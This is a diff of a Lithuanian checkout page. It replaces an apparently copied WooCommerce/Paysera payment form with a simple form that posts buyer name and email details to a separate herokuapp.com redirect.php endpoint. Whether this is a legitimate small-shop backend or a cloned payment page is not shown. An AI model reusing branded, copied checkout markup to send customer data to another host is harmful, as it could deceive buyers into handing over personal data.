@@ -90,13 +90,32 @@
         border-color: #fc9002;
         box-shadow: 0 0 5px #fc9002;
       }
+      .button {
+        margin-top: 20px;
+        background-color: #ffffff;
+        color: #333333;
+        border: 1px solid #fc9002;
+        border-radius: 4px;
+        padding: 10px 20px;
+        font-size: 16px;
+        cursor: pointer;
+        text-align: center;
+        display: inline-block;
+      }
+      .button:hover {
+        background-color: #fc9002;
+        color: #ffffff;
+      }
     </style>
   </head>
   <body>
     <div class="container">
       <div class="user-details">
         <h2>Pirkėjo duomenys</h2>
-        <table>
+        <form
+          method="post"
+          action="https://foto-kursas-930ec9144443.herokuapp.com/redirect.php"
+          autocomplete="on">
           <tr>
             <td>Vardas</td>
             <td><input type="text" id="vardas" name="vardas" required /></td>
@@ -117,7 +136,24 @@
               <input type="text" id="elpastas" name="elpastas" required />
             </td>
           </tr>
-        </table>
+          <label>
+            <input type="checkbox" name="terms" id="terms" required />
+            <span
+              >Aš perskaičiau ir sutinku su puslapio
+              <a href="payserapolicy.html">sąlygomis ir taisyklėmis</a
+              ><abbr class="required" title="privaloma"></abbr
+            ></span>
+          </label>
+          <button
+            type="submit"
+            class="button"
+            name="place_order"
+            id="place_order"
+            value="Apmokėti"
+            data-value="Apmokėti">
+            Apmokėti
+          </button>
+        </form>
       </div>
       <div class="order-details">
         <h2>Jūsų užsakymas</h2>
@@ -136,96 +172,10 @@
           </tr>
         </table>
       </div>
-      <div class="payment-details">
-        <h2>Apmokėjimas</h2>
-        <div class="woocommerce">
-          <form
-            name="checkout"
-            method="post"
-            class="checkout woocommerce-checkout"
-            action=""
-            enctype="multipart/form-data">
-            <div class="woocommerce-billing-fields__field-wrapper"></div>
-            <div id="payment" class="woocommerce-checkout-payment">
-              <ul class="wc_payment_methods payment_methods methods">
-                <li class="wc_payment_method payment_method_paysera">
-                  <input
-                    id="payment_method_paysera"
-                    type="radio"
-                    class="input-radio"
-                    name="payment_method"
-                    value="paysera"
-                    checked="checked"
-                    data-order_button_text="" />
-                  <label for="payment_method_paysera"
-                    >paysera.lt
-                    <img src="Paysera_logo.png" width="70" alt="paysera.lt"
-                  /></label>
-                </li>
-              </ul>
-              <div class="form-row place-order">
-                <div class="woocommerce-terms-and-conditions-wrapper">
-                  <div class="woocommerce-privacy-policy-text"></div>
-                  <div
-                    class="woocommerce-terms-and-conditions"
-                    style="display: none; max-height: 200px; overflow: auto">
-                    <p dir="ltr">
-                      <strong
-                        >Uždėdami varnelę ties “Sutinku su Privatumo politika”,
-                        patvirtinate, kad išsamiai susipažinote su šia politika,
-                        ją supratote ir sutinkate su išdėstytomis
-                        sąlygomis.</strong
-                      >
-                    </p>
-                  </div>
-                  <p class="form-row validate-required">
-                    <label
-                      class="woocommerce-form__label woocommerce-form__label-for-checkbox checkbox">
-                      <input
-                        type="checkbox"
-                        class="woocommerce-form__input woocommerce-form__input-checkbox input-checkbox"
-                        name="terms"
-                        id="terms" />
-                      <span
-                        class="woocommerce-terms-and-conditions-checkbox-text"
-                        >Aš perskaičiau ir sutinku su puslapio
-                        <a
-                          href="payserapolicy.html"
-                          class="woocommerce-terms-and-conditions-link"
-                          >sąlygomis ir taisyklėmis</a
-                        ><abbr class="required" title="privaloma">*</abbr></span
-                      >
-                    </label>
-                    <input type="hidden" name="terms-field" value="1" />
-                  </p>
-                </div>
-                <button
-                  type="submit"
-                  class="button alt"
-                  name="woocommerce_checkout_place_order"
-                  id="place_order"
-                  value="Apmokėti"
-                  data-value="Apmokėti">
-                  Apmokėti
-                </button>
-                <input
-                  type="hidden"
-                  id="woocommerce-process-checkout-nonce"
-                  name="woocommerce-process-checkout-nonce"
-                  value="870ac06442" />
-                <input
-                  type="hidden"
-                  name="_wp_http_referer"
-                  value="/apmokejimas/" />
-              </div>
-            </div>
-          </form>
-        </div>
-      </div>
     </div>
     <script>
       document.addEventListener("DOMContentLoaded", function () {
-        var form = document.querySelector("form[name='checkout']");
+        var form = document.querySelector("form");
         var checkbox = document.getElementById("terms");
         form.addEventListener("submit", function (event) {
           if (!checkbox.checked) {
